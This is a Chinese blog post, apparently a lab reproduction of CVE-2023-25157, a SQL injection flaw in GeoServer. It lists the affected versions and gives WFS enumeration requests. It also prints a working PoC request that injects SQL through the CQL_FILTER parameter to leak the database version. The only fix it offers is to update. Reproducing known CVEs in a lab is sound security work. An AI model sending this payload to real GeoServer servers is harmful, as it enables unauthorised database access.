#  【漏洞复现】GeoServer SQL注入漏洞（CVE-2023-25157）   
紫色皓月  皓月的笔记本   2023-10-14 10:00  
  
声明：请勿将文章内的相关技术用于非法目的，如有相关非法行为与文章作者和本公众号无关。请遵守《中华人民共和国网络安全法》。  
  
0X01 简介  
  
GeoServer 是 OpenGIS
Web 服务器规范的 J2EE 实现，利用 GeoServer可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作，通过 GeoServer 可以比较容易的在用户之间迅速共享空间地理信息。  
  
  
官网：  
  
  
https://geoserver.org/  
  
  
漏洞编号：  
  
CVE-2023-25157  
  
  
影响范围：  
  
GeoServer < 2.21.4  
  
GeoServer < 2.22.2  
  
  
复现环境：  
  
GeoServer 2.22.1  
  
  
0X02   
漏洞复现  
  
获取图层信息  
```
http://192.168.245.134:8080/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPJddSucwnoGlt4IZDoSicRa0X6tzdb4cm8bVUibvVEwRwX9sRDQXrXMakNh7gPMjBufE59r6ntibdGqg/640?wx_fmt=jpeg "")  
  
获取图层属性  
```
http://192.168.245.134:8080/geoserver/wfs?request=DescribeFeatureType&version=2.0.0&service=WFS&outputFormat=application/json&typeName=ne:ceshi{图层名称}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPJddSucwnoGlt4IZDoSicRa0hMBQTtDtN8ibqsKCd4Gkkh6fPvibPfFULkdyI7xljDC3crWLdqA5iaajQ/640?wx_fmt=jpeg "")  
  
POC：  
```
GET /geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=ne:ceshi{图层名称}&CQL_FILTER=strStartsWith(test{图层属性},%27x%27%27)+%3d+true+and+1%3d(SELECT+CAST+((SELECT+version())+AS+INTEGER))+--+%27)+%3d+true HTTP/1.1
Host: 192.168.245.134:8080
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPJddSucwnoGlt4IZDoSicRa0lWT3zdI91ykDiazbdFaEctyrCxtZrmicYhVpLiaNJf6JtzElE9eR4K23w/640?wx_fmt=jpeg "")  
  
  
0X03 修复建议  
  
更新至最新版！  
  
  
0X04 写在最后  
  
  
回复“加群”，获取群号。  
  
侵删！  
  
  
